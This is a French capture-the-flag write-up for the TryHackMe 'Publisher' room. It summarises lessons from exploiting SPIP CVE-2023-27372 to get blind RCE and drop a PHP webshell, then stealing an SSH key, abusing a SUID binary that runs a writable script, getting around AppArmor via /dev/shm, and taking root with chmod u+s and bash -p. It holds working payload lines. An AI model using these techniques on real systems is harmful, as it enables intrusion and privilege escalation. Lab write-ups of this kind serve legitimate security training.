---
title: "Publisher"
category: rooms
icon: "📰"
difficulty: "Easy"
platform: "THM"
status: "Terminée"
tags: [spip, cve-2023-27372, rce, webshell, egress-filtering, ssh, lateral-movement, suid, apparmor, privesc, python2]
summary: "Réflexes acquis — réparer un PoC Python en chaîne, lire la couche d'une erreur, RCE aveugle → webshell, egress filtering (entrant vs sortant), SUID clean → clé SSH, binaire SUID custom + script writable, bypass AppArmor via /dev/shm, chmod u+s + bash -p."
updated: 2026-09-29
source: agent
---

> Une box = quelques réflexes. Ce que j'ai vu, le réflexe à acquérir, où il s'applique en général.

## Pattern : un PoC public = une série de réparations (Python)

Les vieux exploits exploit-db cassent sur Kali récent. Chaîne de fixes rencontrée ici :
- `print "x"` (sans parenthèses) → script **Python 2** → lancer avec `python2`.
- `urllib3.util.ssl_.DEFAULT_CIPHERS` supprimé en urllib3 v2 → **commenter la ligne** (workaround cipher, pas la logique de l'exploit).
- `timeout=10` codé en dur trop court sur réseau lent → `sed -i 's/timeout=10/timeout=60/g' exploit.py`.

Réflexe : une ligne qui plante et qui **ne touche pas la logique** de l'exploit (cipher, print couleur, timeout) → neutralise-la, ne te bats pas avec la dépendance.

## Pattern : lire à QUELLE COUCHE une erreur se produit

- `ConnectTimeout` / `Max retries exceeded` = couche **réseau/TCP** → "je joins pas la cible" → problème de reachability, pas l'exploit.
- Une réponse HTTP (404, "token not found", 500) = cible **jointe** → problème plus haut (chemin, appli).
- **Aucune sortie + aucune erreur ≠ échec** → possible RCE **aveugle** (exécute sans renvoyer le stdout).

## Pattern : RCE aveugle → déposer un webshell

- Exploit qui exécute mais ne renvoie pas la sortie → utilise-le pour **écrire un webshell PHP**, puis interagir via URL (sortie fiable, sans callback).
- Webshell : `<?php system($_GET['cmd']); ?>` → **base64** pour passer les caractères spéciaux à travers l'exploit → décodé sur la cible (`echo <b64> | base64 -d > sh.php`).
- Confort côté attaquant : `shell(){ curl -s "http://IP/spip/sh.php" -G --data-urlencode "cmd=$1"; echo; }` puis `shell 'id'`.
- `--data-urlencode` de curl encode le payload dans le param URL à ta place.

## Pattern : egress filtering (entrant ≠ sortant)

- Webshell marche (toi→cible, entrant sur 80) MAIS reverse shell / callback jamais reçu (cible→toi, sortant) = la cible **bloque les connexions sortantes**.
- Test décisif : depuis le webshell, `curl` vers ton listener sur un port commun. Rien même sur 80/443 → egress filtré.
- Conséquence : reverse shell mort → on finit **au webshell**. SSH reste possible (c'est **entrant** vers la cible).

## Pattern : SUID clean → fouiller les homes → clé SSH (lateral movement)

- `find / -perm -4000` ne montre que des SUID **standards** → la privesc part d'ailleurs, pas de la SUID directe.
- Réflexe (déjà fait sur [[basic-pentesting]]) : énumérer `/home/*`, chercher un `.ssh/id_rsa` **lisible** → SSH en tant que cet user.
- `chmod 600` sur la clé volée **avant** `ssh -i` (sinon ssh refuse une clé trop permissive).

## Pattern : binaire SUID custom qui exécute un script modifiable

- Re-scan `find / -perm -4000` après le pivot (la visibilité change selon l'user) → repérer le binaire **non-standard** (ici `/usr/sbin/run_container`).
- `strings <binaire> | grep '\.sh'` → trouver le script qu'il lance ; `ls -la` dessus → vérifier qu'il est **writable**.
- Vuln = binaire SUID root qui exécute un script que **tu contrôles** → tu décides ce que root exécute (même famille que cron-root-sur-script-writable / systemctl SUID).
- Script d'origine buggé ou avec un menu ? → **écrase-le** avec ton seul payload (`printf '#!/bin/bash\nchmod u+s /bin/bash\n' > script.sh`) plutôt que d'ajouter à la fin — un ajout en fin de fichier peut ne jamais s'exécuter si le flux plante avant.

## Pattern : contourner AppArmor via /dev/shm

- AppArmor = contrôle d'accès qui restreint un programme **par chemin/règles**, en plus des perms Unix. Un shell confiné (`/usr/sbin/ash`) peut bloquer une écriture dans `/opt` même si les perms Unix l'autorisent.
- Bypass : lancer un binaire **sans profil AppArmor** → copier bash dans un chemin autorisé (`/dev/shm`) et l'exécuter → shell **non confiné**.
- `ETXTBSY` ("Text file busy") : on peut **exécuter** mais pas **écraser** un binaire en cours d'exécution → réutiliser l'existant ou copier sous un autre nom.

## Pattern : chmod u+s + bash -p

- Payload root classique : `chmod u+s /bin/bash` (met le bit SUID sur bash).
- Puis `/bin/bash -p` : le `-p` empêche bash de **lâcher les privilèges élevés** au démarrage → un bash SUID donne un shell root effectif (`euid=0`).
